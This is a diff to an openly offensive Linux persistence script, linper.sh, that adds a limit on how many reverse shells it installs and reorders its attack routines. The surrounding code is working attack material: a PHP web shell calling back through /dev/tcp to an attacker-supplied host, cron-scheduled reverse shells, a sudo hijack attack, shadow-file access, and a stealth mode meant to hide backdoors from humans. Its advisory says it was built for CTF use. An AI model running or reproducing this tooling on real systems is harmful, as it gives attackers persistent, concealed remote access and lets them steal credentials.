@@ -7,6 +7,8 @@ DRYRUN=0
 ENUM_DEF=0
 STEALTHMODE=0
 VALIDSYNTAX=0
+LIMIT=0
+COUNTER=0
 
 if $(which srm | grep -qi srm);
 then
@@ -34,13 +36,14 @@ TMPPIP3DIR=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-
 TMPRCLOCAL=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
 TMPWEB=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
 
-INFO="Automatically install multiple methods of persistence\n\nAdvisory: This was developed with CTFs in mind and that is its intended use case. The stealth-mode option is for King of the Hill style competitions where others might try and tamper with your persistence. Please do not use this tool in an unethical or illegal manner.\n"
+INFO="automatically install multiple methods of persistence\n\nadvisory: this was developed with ctfs in mind and that is its intended use case. please do not use this tool in an unethical or illegal manner.\n"
 
 HELP="\e[33m-h, --help\e[0m show this message
 \e[33m-d, --dryrun\e[0m dry run, do not install persistence, just enumerate relevant binaries
 \e[33m-e, --enum-defenses\e[0m try to enumerate any defenses relevant to installing reverse shells
 \e[33m-i, --rhost\e[0m IP/domain to call back to
 \e[33m-p, --rport\e[0m port to call back to
+\e[33m-l, --limit\e[0m number of reverse shells to install (default: all)
 \e[33m--cron\e[0m cron schedule for any reverse shells executed by crontab (default: every minute)
 \e[33m-c, --clean\e[0m removes any reverse shells installed by this program for the given RHOST
 \e[33m-s, --stealth-mode\e[0m various trivial modifications in an attempt to hide the backdoors from humans
@@ -48,20 +51,29 @@ HELP="\e[33m-h, --help\e[0m show this message
 
 Examples:
 
-Enumerate Binaries that can be used for persistence
+Enumerate binaries that can be used for persistence
     bash linper.sh -d
+    bash linper.sh --dryrun
 
-Install Persistence to call back to 192.168.1.2:4444 (default cron & noisy)
+Enumerate defenses
+    bash linper.sh -e
+    bash linper.sh --enum-defenses
+
+Install persistence to call back to 192.168.1.2:4444 (default cron & noisy)
     bash linper.sh -i 192.168.1.2 -p 4444
+    bash linper.sh --rhost 192.168.1.2 -rport 4444
 
-Install Persistence (custom cron & stealthy)
+Install only 3 reverse shells
+    bash linper.sh -i 192.168.1.2 -p 4444 -l 3
+    bash linper.sh --rhost 192.168.1.2 --rport 4444 --limit 3
+
+Install persistence (custom cron & stealthy)
     bash linper.sh -i 192.168.1.2 -p 4444 --cron \"* * * 2 3\" -s
+    bash linper.sh -rhost 192.168.1.2 --rport 4444 --cron \"* * * 2 3\" --stealth-mode
 
-Remove Persistence for 192.168.1.2
+Remove persistence for 192.168.1.2
     bash linper.sh -i 192.168.1.2 -c
-
-Enumerate Defenses
-    bash linper.sh --enum-defenses"
+    bash linper.sh --rhost 192.168.1.2 --clean"
 
 while test $# -gt 0;
 do
@@ -92,6 +104,13 @@ do
 	    if test $# -gt 0;
 	    then
 		export RPORT=$1
+	    fi
+	    shift ;;
+	-l|--limit)
+	    shift
+	    if test $# -gt 0
+	    then
+		export LIMIT=$1
 	    fi
 	    shift ;;
 	-c|--clean)
@@ -127,6 +146,18 @@ syntax_checker() {
 	:
     else
 	invalid_syntax_exit
+    fi
+
+}
+
+limit_checker(){
+
+    if test $1 -eq $LIMIT;
+    then
+	echo "-----------------------"
+	echo -e "\e[92m[+]\e[0m Installed $LIMIT reverse shells; exiting"
+	echo "-----------------------"
+	exit
     fi
 
 }
@@ -231,7 +262,9 @@ enum_doors() {
 			    echo -e "\e[92m[+]\e[0m Door Found: $DOOR"
 			    if [ "$DRYRUN" -eq 0 ];
 			    then
-				echo "$HINGE" | $SHELL 2> /dev/null &> /dev/null && echo -e "\e[92m[+]\e[0m Persistence Installed: $METHOD using $DOOR"
+				echo "$HINGE" | $SHELL 2> /dev/null &> /dev/null &&
+				echo -e "\e[92m[+]\e[0m Persistence Installed: $METHOD using $DOOR" &&
+				COUNTER=$(expr $COUNTER + 1) && limit_checker $COUNTER
 			    fi
 			fi
 		    fi
@@ -276,7 +309,7 @@ webserver_poison_attack() {
 			    fi
 
 			    PAYLOAD="<?php exec(\"$SHELL -c '$SHELL -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\"); ?>"
-			    echo $PAYLOAD > $i/$RANDOMPHPFILE && echo -e "\e[92m[+]\e[0m Persistence Installed: PHP Reverse Shell $i/$RANDOMPHPFILE"
+			    echo $PAYLOAD > $i/$RANDOMPHPFILE && echo -e "\e[92m[+]\e[0m Persistence Installed: PHP Reverse Shell $i/$RANDOMPHPFILE" && COUNTER=$(expr $COUNTER + 1) && limit_checker $COUNTER
 			    IFS="?"
 			fi
 		    done
@@ -437,10 +470,10 @@ main() {
     then
 	stealth_modifications
     fi
-    enum_methods
     sudo_hijack_attack $TMPPASSWORDFILE
-    webserver_poison_attack
     shadow
+    enum_methods
+    webserver_poison_attack
 
 }
 
